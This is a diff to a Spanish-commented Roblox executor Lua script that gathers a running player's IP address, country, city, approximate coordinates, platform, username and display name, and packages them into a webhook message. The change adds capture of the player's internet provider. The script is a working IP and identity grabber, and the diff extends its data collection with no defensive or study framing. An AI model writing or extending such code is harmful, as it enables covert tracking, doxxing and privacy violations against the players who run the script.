@@ -9,11 +9,12 @@ getgenv().ScriptEjecutado = true
 -- Detecta plataforma
 local platform = "Desconocido"
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    platform = "Teléfono" -- solo Teléfono
+    platform = "Teléfono"
 elseif UserInputService.KeyboardEnabled then
     platform = "PC"
 end
 
+-- Convierte código ISO a emoji de bandera
 local function codeToEmoji(code)
     if not code or #code ~= 2 then return "🏳️" end
     local first = string.byte(code:sub(1,1):upper()) - 65 + 0x1F1E6
@@ -21,8 +22,9 @@ local function codeToEmoji(code)
     return utf8.char(first, second)
 end
 
+-- Detecta ubicación e ISP
 local function detectLocation()
-    local country, countryCode, city, ip, lat, lon = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil
+    local country, countryCode, city, ip, lat, lon, isp = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil, "Desconocido"
     local services = {
         "https://ipapi.co/json"
     }
@@ -36,7 +38,6 @@ local function detectLocation()
                 local latTemp = tonumber(data.latitude or data.lat)
                 local lonTemp = tonumber(data.longitude or data.lon)
                 if latTemp and lonTemp then
-                    -- Ajuste aleatorio pequeño para caer en tierra firme
                     latTemp = latTemp + (math.random(-20,20)/1000)
                     lonTemp = lonTemp + (math.random(-20,20)/1000)
 
@@ -46,6 +47,7 @@ local function detectLocation()
                     ip = data.ip or ip
                     lat = latTemp
                     lon = lonTemp
+                    isp = data.org or isp -- ISP capturado
                     break
                 end
             end
@@ -68,10 +70,14 @@ local function detectLocation()
     end
 
     local longDisplay = lat and lon and (lat..", "..lon) or "N/A"
-    return displayCountry, city, km, longDisplay, ip, lat, lon
+    return displayCountry, city, km, longDisplay, ip, lat, lon, isp
 end
 
-local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal = detectLocation()
+local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()
+
+-- Determinar valor ISP y color del embed
+local ispDisplay = ispName ~= "Desconocido" and ("💠 "..ispName) or "🌀 Desconocido"
+local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332 -- naranja si se detecta, rojo si no
 
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
@@ -92,6 +98,7 @@ local data = {
         ["fields"] = {
             {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
             {["name"]="📡 IP", ["value"]=userIP, ["inline"]=true},
+            {["name"]="🌐 Compañía de Internet", ["value"]=ispDisplay, ["inline"]=true}, -- ISP con color y emoji
             {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
             {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
